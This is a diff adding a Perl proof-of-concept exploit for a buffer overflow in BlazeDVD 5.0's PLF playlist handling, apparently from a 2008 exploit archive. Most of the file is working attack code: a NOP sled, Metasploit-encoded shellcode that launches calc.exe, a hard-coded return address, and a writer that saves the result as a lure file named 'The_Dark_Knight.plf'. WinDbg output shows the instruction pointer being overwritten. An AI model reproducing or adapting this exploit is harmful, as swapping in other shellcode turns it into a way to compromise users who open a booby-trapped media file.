@@ -1,0 +1,109 @@
+#!/usr/bin/perl
+#
+# Title: BlazeDVD 5.0 PLF Playlist File Remote Buffer Overflow Exploit (PoC)
+#
+# Summary: BlazeDVD is leading powerful and easy-to-use DVD player software.
+# It can provide superior video and audio(Dolby) quality, together with other
+# enhanced features:e.g. recording DVD,playback image and DV,bookmark and image
+# capture.etc.Furthermore, besides DVD,Video CD,Audio CD, BlazeDVD supports DIVX,
+# MPEG4, RM, QuickTime, WMV, WMV-HD, MacroMedia Flash and any other video file
+# you have the codec installed for.The DVD player software can be extensive
+# compatible with hardware,which is operated stable,smoothly under Windows98,
+# 98SE, Me, 2000, XP, VISTA.
+#
+# Product web Page: http://www.blazevideo.com/dvd-player/index.htm
+#
+# Desc: BlazeDVD 5.0 suffers from buffer overflow vulnerability that can be
+# exploited via crafted PLF playlist file localy and remotely. It fails to
+# perform boundry checking of the user input file, allowing the EIP to be
+# overwritten, thus, controling the next insctruction of the software. After
+# succesfull exploitation, calc.exe will be executed. Failed attempts will
+# result in Denial Of Service (DoS).
+#
+# WinDgb(output):
+#
+#  - (4d8.f80): Access violation - code c0000005 (first chance)
+#  - First chance exceptions are reported before any exception handling.
+#  - This exception may be expected and handled.
+#  - eax=00000001 ebx=77f6c15c ecx=04bd0ba8 edx=00000042 esi=01beffc0 edi=6405565c
+#  - eip=41414141 esp=0012f188 ebp=01befcf8 iopl=0         nv up ei pl nz ac pe nc
+#  - cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
+#  - 41414141 ??              ???
+#
+#
+# Tested on Microsoft Windows XP SP2 (English)
+#
+# Vulnerability discovered by: Parvez Anwar and Greg Linares
+#
+# Refs:
+#
+# - http://secunia.com/advisories/23041/
+# - http://www.frsirt.com/english/advisories/2006/4764
+# - http://xforce.iss.net/xforce/xfdb/30567
+# - http://osvdb.org/30770
+# - http://www.securityfocus.com/bid/21337/
+# - http://www.milw0rm.com/exploits/2880
+#
+# Exploit coded by Gjoko 'LiquidWorm' Krstic
+#
+# liquidworm@gmail.com
+#
+# http://www.zeroscience.org
+#
+# 08.08.2008
+#
+
+print "\n|==================================================================|\n";
+print "|                                                                  |\n";
+print "|    BlazeDVD 5.0 PLF Playlist File Remote Buffer Overflow Exploit |\n";
+print "|              by LiquidWorm <liquidworm [at] gmail.com>           |\n";
+print "|                                                                  |\n";
+print "|==================================================================|\n\n";
+
+$nop = "\x90" x 96;
+
+
+# win32_exec EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com
+
+$shellcode = "\x29\xc9\x83\xe9\xdd\xd9\xee".
+	     "\xd9\x74\x24\xf4\x5b\x81\x73".
+	     "\x13\x7d\xe6\xe7\x4e\x83\xeb".
+	     "\xfc\xe2\xf4\x81\x0e\xa3\x4e".
+	     "\x7d\xe6\x6c\x0b\x41\x6d\x9b".
+	     "\x4b\x05\xe7\x08\xc5\x32\xfe".
+	     "\x6c\x11\x5d\xe7\x0c\x07\xf6".
+	     "\xd2\x6c\x4f\x93\xd7\x27\xd7".
+	     "\xd1\x62\x27\x3a\x7a\x27\x2d".
+	     "\x43\x7c\x24\x0c\xba\x46\xb2".
+	     "\xc3\x4a\x08\x03\x6c\x11\x59".
+	     "\xe7\x0c\x28\xf6\xea\xac\xc5".
+	     "\x22\xfa\xe6\xa5\xf6\xfa\x6c".
+	     "\x4f\x96\x6f\xbb\x6a\x79\x25".
+	     "\xd6\x8e\x19\x6d\xa7\x7e\xf8".
+	     "\x26\x9f\x42\xf6\xa6\xeb\xc5".
+	     "\x0d\xfa\x4a\xc5\x15\xee\x0c".
+	     "\x47\xf6\x66\x57\x4e\x7d\xe6".
+	     "\x6c\x26\x41\xb9\xd6\xb8\x1d".
+	     "\xb0\x6e\xb6\xfe\x26\x9c\x1e".
+	     "\x15\x16\x6d\x4a\x22\x8e\x7f".
+	     "\xb0\xf7\xe8\xb0\xb1\x9a\x85".
+	     "\x86\x22\x1e\xc8\x82\x36\x18".
+	     "\xe6\xe7\x4e";
+
+
+$ret = "\x78\x53\xbe\x01";
+
+$payload = $nop.$shellcode.$ret;
+
+open(plf, ">./The_Dark_Knight.plf");
+
+print plf "$payload";
+
+print "\n--> Playlist: The_Dark_Knight.plf succesfully created...Enjoy!\n\n";
+
+print "\n...t00t w00t!\n\a\n";
+
+
+# August, 2008
+
+# milw0rm.com [2008-08-10]
